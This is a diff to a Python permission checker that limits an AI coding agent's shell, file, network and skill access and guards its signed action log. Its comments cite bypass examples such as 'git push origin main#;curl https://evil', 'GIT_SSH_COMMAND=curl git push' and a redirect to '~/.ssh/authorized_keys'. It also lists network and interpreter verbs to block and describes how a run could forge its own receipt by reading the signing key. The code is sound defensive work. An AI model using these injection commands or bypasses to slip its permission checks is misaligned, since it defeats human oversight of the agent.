@@ -16,31 +16,47 @@ Five schemes, and each is enforced by a different piece of evidence:
     tool:Agent             sub-agents (`Task`), which are not free by default
     tool:Skill:<name>      one named skill; `tool:Skill:*` for all of them
 
-Built-in read-only tools (Read, Grep, Glob, ...) are always allowed: a routine
-that cannot read cannot draft, and reading inside a repo the human already
-opened is not the risk this file exists to manage. Everything else is denied
-unless something above grants it.
+Built-in read-only tools (Read, Grep, Glob, ...) are allowed **except on the
+control plane's own state**: reading inside the repo the human already opened is
+not the risk this file exists to manage, but `~/.teyla/hmac.key` is the key that
+signs the action log, and a run that can read it can forge its own receipt.
+Everything else is denied unless something above grants it.
 
-Four things this file refuses regardless of what was granted, because each one
+Six things this file refuses regardless of what was granted, because each one
 turns a narrow grant into a broad one:
 
-* **Writes to the control plane's own files.** `grants.json`, `actions.jsonl`
-  and friends, anywhere, and anything under `~/.teyla`. A run that can rewrite
-  its own grants has none; a run that can rewrite its own action log has no
-  receipt. See `state.CONTROL_BASENAMES`.
+* **Any access — write *or* read — to the control plane's own files.**
+  `grants.json`, `actions.jsonl` and friends, anywhere, and anything under
+  `~/.teyla`. A run that can rewrite its own grants has none; a run that can
+  rewrite (or read the signing key of) its own action log has no receipt. See
+  `state.CONTROL_BASENAMES`, and `names_control_state` for the Bash side.
 * **Environment-assignment prefixes** (`FOO=1 cmd`) unless `shell:env` is
-  granted, and `PATH=`, `GIT_CONFIG*`, `LD_*`, `DYLD_*` even then. `GIT_CONFIG_KEY_0=alias.push
-  GIT_CONFIG_VALUE_0='!curl…|sh' git push` is a `shell:git push` grant turned
-  into arbitrary execution, and it reads as an ordinary push.
+  granted — and even then only an **allowlist** of names: `TEYLA_*`, `LANG`,
+  `LC_*`, `TZ`, `NO_COLOR`, `PAGER=cat`. Everything else is refused, `GIT_*`
+  (`GIT_SSH_COMMAND=curl git push`), `HOME` (`HOME=runs git push`, with a
+  `runs/.gitconfig` alias), `SSH*`, `XDG_*`, `PATH`, `LD_*`, `DYLD_*`,
+  `PYTHON*`, `NODE_*`, `PERL*`, `RUBY*`, `BASH_ENV`, `ENV`, `IFS` and `CDPATH`
+  included. A denylist was the bug: every one of those was a name nobody had
+  thought of yet.
+* **Dangerous verbs** — interpreters (`sh`, `python`, `node`, `perl`, …),
+  copiers (`cp`, `tee`, `ln`, `dd`), privilege changes (`sudo`, `chmod`),
+  network clients (`curl`, `ssh`, `rsync`) and `git -c` / `git --exec-path` —
+  unless `shell:*` is granted. `shell:python` is **not** enough: naming an
+  interpreter as the verb grants everything the interpreter can do, so the grant
+  that allows it has to say so. See `DANGEROUS_VERBS`.
 * **Process substitution** (`>(…)`, `<(…)`), which is a command hiding inside
   what looks like a filename.
 * **Redirection to a path no `fs.write:` grant covers.** `echo x > ~/.ssh/authorized_keys`
   is a write, whatever the verb in front of it says.
+* **Writes outside the product repo.** A relative `fs.write:` glob only ever
+  matches inside the repo root, `fs.write:*` included — that one means "any file
+  in the repo root", never the filesystem. Reaching outside takes an absolute
+  grant (`fs.write:/abs/path/**`), written out in the manifest.
 
-The hole that remains, stated rather than papered over: a `net:` grant can
-exfiltrate anything the run can read, and a `shell:` grant broad enough to run
-an interpreter (or `cp`, or `tee`) can still write where redirection is refused.
-Grant both narrowly.
+The holes that remain, stated rather than papered over: a `net:` grant can
+exfiltrate anything the run can read; `shell:*` (or any grant that reaches an
+interpreter) is **full trust — equivalent to no grants at all**; and the run can
+still read the whole product repo. Grant all three narrowly.
 """
 from __future__ import annotations
 
@@ -64,6 +80,16 @@ READ_ONLY_TOOLS = frozenset({
     "Read", "Grep", "Glob", "LS", "NotebookRead", "TodoWrite", "TodoRead",
     "BashOutput", "KillShell", "KillBash", "ExitPlanMode", "AskUserQuestion",
 })
+
+# The read-only tools that take a path. "Always allowed" was true of these until it
+# was pointed out that `Read ~/.teyla/hmac.key` is the key the action log is signed
+# with: a run that reads it can sign any line it likes, and the receipt — the whole
+# point of the log — becomes something the run wrote. These are checked against the
+# control plane's own paths before they are allowed.
+READ_PATH_TOOLS = frozenset({"Read", "Grep", "Glob", "LS", "NotebookRead"})
+
+# The tool-input keys those tools name a path in.
+READ_PATH_KEYS = ("file_path", "path", "notebook_path", "pattern", "glob", "file")
 
 # Tools that spawn a sub-agent. Allowed only under `tool:Agent` or `tool:Task`.
 AGENT_TOOLS = frozenset({"Task", "Agent"})
@@ -106,10 +132,40 @@ SEGMENT_OPERATORS = frozenset({"&&", "||", "&", ";", "|", "|&", ";;", "\n"})
 WRITE_REDIRECTS = frozenset({">", ">>", ">|", "&>", "&>>", ">&"})
 READ_REDIRECTS = frozenset({"<", "<<", "<<<", "<&", "<>"})
 
-# Environment prefixes that are refused even when `shell:env` is granted, because
-# each one redirects what the *granted* verb afterwards actually executes.
-FORBIDDEN_ENV_PREFIXES = ("PATH", "GIT_CONFIG", "LD_", "DYLD_", "BASH_ENV", "ENV",
-                          "IFS", "SHELL", "PYTHONPATH", "PYTHONSTARTUP", "NODE_OPTIONS")
+# The environment variables a `shell:env` grant may set. An **allowlist**, because
+# the denylist it replaced was only ever a list of the names somebody had already
+# thought of: it named `GIT_CONFIG*` and missed `GIT_SSH_COMMAND=curl git push`, and
+# it named `PATH` and missed `HOME=runs git push` against a planted `runs/.gitconfig`.
+# Anything not named here is refused even under `shell:env`.
+ALLOWED_ENV_NAMES = frozenset({"LANG", "TZ", "NO_COLOR"})
+ALLOWED_ENV_PREFIXES = ("TEYLA_", "LC_")
+# `PAGER` is allowed only as `PAGER=cat`: its whole purpose is to name a program to run.
+ALLOWED_ENV_EXACT = {"PAGER": "cat"}
+
+# Named in the refusal so the message says why, not just no. Not the check — the
+# check is the allowlist above, and these are examples of what it excludes.
+NOTABLE_DENIED_ENV = ("PATH", "GIT_* (GIT_SSH_COMMAND, GIT_CONFIG_KEY_0, ...)", "HOME",
+                      "SSH*", "XDG_*", "LD_*", "DYLD_*", "PYTHON*", "NODE_*", "PERL*",
+                      "RUBY*", "BASH_ENV", "ENV", "IFS", "CDPATH")
+
+# Verbs that can run, write or fetch anything once they start, whatever their
+# arguments say. A grant naming one of these by name — `shell:python` — would be a
+# narrow-looking grant for an unbounded capability, so each of them needs `shell:*`,
+# which the docs describe for what it is: full trust, equivalent to no grants.
+DANGEROUS_VERBS = frozenset({
+    "sh", "bash", "zsh", "dash", "fish", "ksh", "csh", "tcsh",
+    "python", "python2", "python3", "node", "deno", "bun", "perl", "ruby", "php",
+    "xargs", "find", "env", "eval", "exec", "source", ".", "tee",
+    "cp", "mv", "ln", "install", "dd", "chmod", "chown", "sudo", "su",
+    "nohup", "setsid", "osascript", "open",
+    "curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "rsync",
+})
+
+# `git -c core.pager='!sh'` and `git --exec-path=/tmp` turn `shell:git push` into
+# arbitrary execution the same way an environment prefix did.
+GIT_DANGEROUS_FLAGS = ("-c", "--exec-path", "--config-env")
+
+_INTERPRETER_RE = re.compile(r"^(python|ruby|perl|php|node)[0-9.]*$", re.I)
 
 _ASSIGN_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=")
 
@@ -226,7 +282,12 @@ def path_matches(target, patterns, repo) -> bool:
     both relative to the repo root and absolute, so `runs/**` and `/tmp/scratch/**`
     both work. A pattern that is *not* absolute only ever matches inside the repo:
     a relative-looking path that resolves out of the tree is a symlink escape, and
-    `runs/**` was never a grant to write wherever `runs/x` happens to point."""
+    `runs/**` was never a grant to write wherever `runs/x` happens to point.
+
+    That holds for `*` and `**` too. `fs.write:*` means "any file in the repo root,
+    no slash in it" — one path segment, matched against the repo-relative path — and
+    `fs.write:**` means "anywhere in the repo". Neither reaches outside it; that
+    takes an absolute grant, written out: `fs.write:/abs/path/**`."""
     ok, _ = write_target_ok(target, patterns, repo)
     return ok
 
@@ -263,8 +324,6 @@ def write_target_ok(target, patterns, repo) -> tuple[bool, str]:
         pat = _norm(str(raw)).strip()
         if not pat:
             continue
-        if pat in ("*", "**", "**/*"):
-            return True, f"`fs.write:{raw}` covers everything"
         absolute = pat.startswith("/") or pat.startswith("~")
         if pat.startswith("~"):
             pat = _norm(str(pathlib.Path(pat).expanduser()))
@@ -279,9 +338,11 @@ def write_target_ok(target, patterns, repo) -> tuple[bool, str]:
                 return True, f"{target} is within `fs.write:{raw}`"
 
     granted = ", ".join(str(p) for p in patterns) or "(none)"
-    if not inside and not any(str(p).strip().startswith(("/", "~")) for p in patterns):
-        return False, (f"{target} resolves to {real}, outside the repo {repo_real} — "
-                       f"the `fs.write:` grants [{granted}] are all repo-relative")
+    if not inside:
+        return False, (f"{target} resolves to {real}, outside the repo {repo_real}. "
+                       f"A relative `fs.write:` grant — `*` and `**` included — only ever "
+                       f"matches inside the repo; reaching outside it takes an absolute grant "
+                       f"such as `fs.write:{real.parent}/**`. Granted: [{granted}]")
     return False, f"{target} is outside the `fs.write:` grants [{granted}]"
 
 
@@ -289,13 +350,27 @@ def write_target_ok(target, patterns, repo) -> tuple[bool, str]:
 
 
 def tokenize(command: str) -> list[str]:
-    """One command string -> words and operators, quotes respected.
+    """One **line** of a command string -> words and operators, quotes respected.
 
     `shlex` with `punctuation_chars` is the only stdlib thing that knows `&&` from
     `&`, and it keeps `>`/`>>`/`<(` as their own tokens, which is what the
-    redirection and process-substitution checks below need."""
+    redirection and process-substitution checks below need.
+
+    Two of its defaults are wrong for this job and are turned off here:
+
+    * `commenters='#'` **strips from `#` to the end of the string, mid-token
+      included**. `git push origin main#;curl https://evil` lexed as `git push
+      origin main` — a granted push — while bash, for which `#` is only a comment
+      at the start of a word, ran the curl. `commenters=""` makes `#` an ordinary
+      character and lets `;` do the splitting; a segment that is *entirely* a
+      comment is dropped in `split_segments`, which is the only place `#` means
+      anything.
+    * newlines are whitespace under `whitespace_split`, so `git push\ncurl evil`
+      was one segment whose verb was `git push`. The caller splits lines before
+      it gets here — see `split_segments`."""
     lexer = shlex.shlex(command or "", punctuation_chars=True)
     lexer.whitespace_split = True
+    lexer.commenters = ""
     try:
         return list(lexer)
     except ValueError:
@@ -306,18 +381,28 @@ def tokenize(command: str) -> list[str]:
 
 def split_segments(command: str) -> list[list[str]]:
     """The command, cut at every separator, as a list of token lists. Every one of
-    them has to be granted — that is the whole point of splitting."""
+    them has to be granted — that is the whole point of splitting.
+
+    **A newline is a separator.** `\n` and `\r` are cut first, before tokenizing,
+    because `shlex` in `whitespace_split` mode swallows them: `git push origin
+    main\ncurl https://evil` arrived here as one segment whose first two tokens
+    were a granted `git push`, and the second line ran unexamined. Every line is at
+    least one segment, and `;`/`|`/`&&`/`||`/`&` cut it further."""
     out: list[list[str]] = []
-    cur: list[str] = []
-    for tok in tokenize(command):
-        if tok in SEGMENT_OPERATORS:
-            if cur:
-                out.append(cur)
-            cur = []
-            continue
-        cur.append(tok)
-    if cur:
-        out.append(cur)
+    # A backslash-newline is a line continuation, not a separator: the shell joins
+    # those two lines into one command and so does this.
+    joined = re.sub(r"\\\r?\n", " ", command or "")
+    for line in re.split(r"[\n\r]+", joined):
+        cur: list[str] = []
+        for tok in tokenize(line):
+            if tok in SEGMENT_OPERATORS:
+                if cur:
+                    out.append(cur)
+                cur = []
+                continue
+            cur.append(tok)
+        if cur:
+            out.append(cur)
     return out
 
 
@@ -384,14 +469,48 @@ def expand_target(target: str, env=None) -> str | None:
 
 
 def _env_prefix_problem(assigns) -> str | None:
+    """An environment prefix that `shell:env` does not cover, or None.
+
+    Allowlisted, not denylisted. The denylist named `GIT_CONFIG` and let
+    `GIT_SSH_COMMAND=curl git push` through; it named `PATH` and let `HOME=runs git
+    push` through, which reads `runs/.gitconfig` the run just wrote. There is no
+    version of that list that is complete, so the question is now which names are
+    *safe*, and the answer is a short list of locale and Teyla's own."""
     for a in assigns:
         m = _ASSIGN_RE.match(a)
         name = m.group(1) if m else a
-        for bad in FORBIDDEN_ENV_PREFIXES:
-            if name == bad or name.startswith(bad):
-                return (f"the segment sets {name}=, which changes what the verb after it actually "
-                        f"runs (PATH/GIT_CONFIG*/LD_*/DYLD_* and friends are refused even under "
-                        f"`shell:env`)")
+        value = _unquote(a.partition("=")[2].strip())
+        if name.startswith(ALLOWED_ENV_PREFIXES) or name in ALLOWED_ENV_NAMES:
+            continue
+        if ALLOWED_ENV_EXACT.get(name) == value:
+            continue
+        allowed = "TEYLA_*, LANG, LC_*, TZ, NO_COLOR, PAGER=cat"
+        return (f"the segment sets {name}=, which changes what the verb after it actually "
+                f"runs. `shell:env` allows an allowlist only ({allowed}); everything else "
+                f"is refused, {', '.join(NOTABLE_DENIED_ENV)} included")
+    return None
+
+
+def dangerous_verb(toks) -> str | None:
+    """The verb of this segment if it is one that no narrow grant can bound, else None.
+
+    Matched on the basename, so `/bin/sh` and `/usr/bin/env` count. `git` counts when
+    it carries `-c` or `--exec-path`, which are how a granted `git push` becomes
+    arbitrary execution without an environment prefix."""
+    if not toks:
+        return None
+    head = str(toks[0])
+    base = head.rsplit("/", 1)[-1]
+    for cand in (head, base):
+        if cand in DANGEROUS_VERBS:
+            return cand
+    if _INTERPRETER_RE.match(base):
+        return base
+    if base == "git":
+        for tok in toks[1:]:
+            for flag in GIT_DANGEROUS_FLAGS:
+                if tok == flag or tok.startswith(flag + "="):
+                    return f"git {flag}"
     return None
 
 
@@ -401,10 +520,11 @@ def shell_allowed(command: str, patterns, *, fs_write=(), repo=".", env=None) ->
 
     A grant is matched token-wise against the head of the segment: `shell:git push`
     matches `git push origin main` and not `git commit`. `shell:*` grants every
-    verb, including the opaque forms (command substitution) that are otherwise
-    refused because they hide the verb this check depends on — but it does not
-    grant process substitution, and it does not exempt a redirection from
-    `fs.write:`."""
+    verb, including the dangerous ones and the opaque forms (command substitution)
+    that are otherwise refused because they hide the verb this check depends on.
+    **`shell:*` is full trust — read it as equivalent to no grants at all.** It
+    still does not grant process substitution, and it still does not exempt a
+    redirection from `fs.write:`."""
     command = command or ""
 
     if _PROCSUB_RE.search(command):
@@ -448,6 +568,13 @@ def shell_allowed(command: str, patterns, *, fs_write=(), repo=".", env=None) ->
                 continue  # a bare `> file` segment: the write was already checked
             return False, f"cannot read a verb from segment {' '.join(seg)!r}"
 
+        # A `#` only starts a comment at the start of a word — which, after splitting,
+        # means a segment whose first word is one. `main#;curl evil` is not a comment,
+        # and reading it as one is how `git push origin main#;curl https://evil` used
+        # to lex down to a granted push.
+        if str(words[0]).startswith("#"):
+            continue
+
         if star:
             continue
         toks = [_unquote(w) for w in words]
@@ -465,6 +592,17 @@ def shell_allowed(command: str, patterns, *, fs_write=(), repo=".", env=None) ->
             verb = " ".join(toks[:2])
             granted = ", ".join(str(p) for p in patterns)
             return False, f"`{verb}` is not matched by any `shell:` grant ({granted})"
+
+        # Granted by name — and still refused, if the name is one that cannot be
+        # bounded. `shell:python` reads like a narrow grant and is not one: it is
+        # every write, every fetch and every verb the interpreter can reach. Only
+        # `shell:*`, which the docs call full trust, allows these.
+        bad = dangerous_verb(toks)
+        if bad:
+            return False, (f"`{bad}` is an interpreter, a copier, a privilege change or a "
+                           f"network client: whatever its arguments say, it can run or write "
+                           f"anything, so the `shell:` grant naming it cannot bound it. It needs "
+                           f"`shell:*` — which is full trust, equivalent to no grants at all")
 
     return True, ("shell:*, with every redirection checked against `fs.write:`" if star
                   else "a shell grant matched every segment, and every redirection was within `fs.write:`")
@@ -485,6 +623,15 @@ def tool_matches(tool_name: str, patterns) -> bool:
 
 
 def net_allowed(url: str, patterns) -> tuple[bool, str]:
+    """One URL against the `net:` grants. Two forms and no others:
+
+        net:api.example.com     exactly that host, nothing else
+        net:*.example.com       that host and any subdomain of it
+
+    Anything else matches nothing, and a suffix of fewer than two labels matches
+    nothing whatever it is written as: `net:com` used to match `evil.com`, because
+    the old check accepted any host *ending in* the grant. So did `net:*` written as
+    `net:*.com`. `net:*` alone is still the deliberate everything grant."""
     if not patterns:
         return False, "no `net:` capability is granted for this run"
     if any(str(p).strip() == "*" for p in patterns):
@@ -493,35 +640,85 @@ def net_allowed(url: str, patterns) -> tuple[bool, str]:
     m = re.match(r"^[a-z][a-z0-9+.-]*://([^/?#]+)", str(url or ""), re.I)
     if m:
         host = m.group(1).split("@")[-1].split(":")[0]
+    host = host.strip().rstrip(".").lower()
     if not host:
         return False, f"cannot read a host from {url!r}"
-    for pat in patterns:
-        pat = str(pat).strip()
-        if fnmatch.fnmatch(host, pat) or host == pat or host.endswith("." + pat):
-            return True, f"net grant {pat} matched host {host}"
-    return False, f"host {host} is not matched by any `net:` grant ({', '.join(patterns)})"
+    for raw in patterns:
+        pat = str(raw).strip().rstrip(".").lower()
+        if not pat:
+            continue
+        if pat.startswith("*."):
+            domain = pat[2:]
+            if domain.count(".") < 1:
+                continue  # `*.com` is a TLD, and a TLD is not a grant
+            if host == domain or host.endswith("." + domain):
+                return True, f"net grant {raw} matched host {host}"
+            continue
+        if "*" in pat:
+            continue  # only `*` and a leading `*.` are grant syntax
+        if host == pat:
+            return True, f"net grant {raw} matched host {host}"
+    return False, (f"host {host} is not matched by any `net:` grant ({', '.join(patterns)}) — "
+                   f"a grant is an exact host or `*.domain`, and a bare TLD matches nothing")
 
 
 def looks_like_send(tool_name: str, command: str = "") -> bool:
     return bool(SEND_RE.search(tool_name or "") or SEND_RE.search(command or ""))
 
 
-def _names_a_control_file(command: str) -> str | None:
-    """Does a Bash command mention the control plane's own state at all?
+_QUOTING_RE = re.compile(r"""["'\\]""")
+
+
+def _flatten(text: str) -> str:
+    """The string as the shell would see it after quote removal: quotes and
+    backslashes dropped, so `~/.te""yla/hmac.key` and `'hmac'.key` read the same as
+    the plain spelling. Concatenation is how a substring test gets dodged."""
+    return _QUOTING_RE.sub("", text or "")
+
+
+def names_control_state(text: str) -> str | None:
+    """Does this string name the control plane's own state at all?
 
     Deliberately coarse: a shell command can reach a file in more ways than a
     checker can enumerate (`cd`, a variable, a relative path, `find -exec`), so the
     test is whether the string names one of these at all, not whether this
     particular invocation would write to it. A false positive costs one renamed
-    scratch file; a false negative costs the receipt its meaning."""
-    text = command or ""
-    for name in S.CONTROL_BASENAMES:
-        if name in text:
+    scratch file; a false negative costs the receipt its meaning — or, in the case
+    of `hmac.key`, lets the run sign its own history.
+
+    Case-insensitive for the filenames with an extension and for `.teyla`/`hmac`,
+    because the filesystem this runs on is case-insensitive too. `KILL` stays
+    case-sensitive: lower-cased it is the substring of every `kill` and `pkill`
+    command there is."""
+    flat = _flatten(text)
+    low = flat.lower()
+    for name in sorted(S.CONTROL_BASENAMES):
+        if "." in name:
+            if name.lower() in low:
+                return name
+        elif name in flat:
             return name
+    for needle in (".teyla", "hmac"):
+        if needle in low:
+            return needle
     home = str(S.home())
     for needle in (home, "~/.teyla", "$TEYLA_HOME", "${TEYLA_HOME}", "$TEYLA_GRANTS", "${TEYLA_GRANTS}"):
-        if needle and needle in text:
+        if needle and needle in flat:
             return needle
+    return None
+
+
+def _names_a_control_file(command: str) -> str | None:
+    """The Bash side of `names_control_state`, applied **per segment and to the
+    tokens joined back together**, so that a name split across tokens or hidden in
+    quotes is seen the way the shell will see it."""
+    hit = names_control_state(command or "")
+    if hit:
+        return hit
+    for seg in split_segments(command or ""):
+        hit = names_control_state(" ".join(str(tok) for tok in seg))
+        if hit:
+            return hit
     return None
 
 
@@ -610,6 +807,25 @@ def decide(tool_name: str, tool_input: dict, doc: dict, state: dict) -> tuple[st
     send = grants.get("send") or []
     tools = grants.get("tool") or []
 
+    # 0. reads of the control plane's own state. Read/Grep/Glob/LS are otherwise
+    # always allowed, and that is what made `~/.teyla/hmac.key` — the key every
+    # action-log line is signed with — readable by every run on the machine. A run
+    # that holds the key can forge the log the receipt is built from, so the read
+    # is refused before anything else is considered.
+    if tool_name in READ_PATH_TOOLS:
+        for key in READ_PATH_KEYS:
+            value = tool_input.get(key)
+            if not isinstance(value, str) or not value.strip():
+                continue
+            named = names_control_state(value)
+            if named is None and not S.is_control_path(value):
+                continue
+            return DENY, (f"{tool_name}: {value} names control-plane state "
+                          f"({named or 'a path under ~/.teyla'}) — the signing key, the run's "
+                          f"grants, its counters, its action log, its receipt. Reading these is "
+                          f"refused under every grant: the key signs the log the receipt is "
+                          f"built from"), delta
+
     # 1. writes
     if tool_name in WRITE_TOOLS:
         target = tool_input.get("file_path") or tool_input.get("path") or tool_input.get("notebook_path") or ""
@@ -658,11 +874,17 @@ def decide(tool_name: str, tool_input: dict, doc: dict, state: dict) -> tuple[st
         want = f"Skill:{name}"
         for p in tools:
             p = str(p).strip()
-            if p in ("Skill", "Skill:*") or fnmatch.fnmatch(want, p):
+            # A bare `tool:Skill` names no skill. It used to allow every one of them,
+            # which is the `tool:Skill:*` grant spelled in a way nobody would read as
+            # "all skills on this machine".
+            if p == "Skill":
+                continue
+            if fnmatch.fnmatch(want, p):
                 return ALLOW, f"Skill {name!r} matched the `tool:{p}` grant", delta
         granted = ", ".join(tools) or "(none)"
         return DENY, (f"the skill {name!r} is not matched by any `tool:` grant [{granted}] — "
-                      f"grant `tool:Skill:{name}`, or `tool:Skill:*` for all of them"), delta
+                      f"grant `tool:Skill:{name}`, or `tool:Skill:*` for all of them. A bare "
+                      f"`tool:Skill` names no skill and grants none"), delta
 
     # 3. network
     if tool_name in NET_TOOLS:
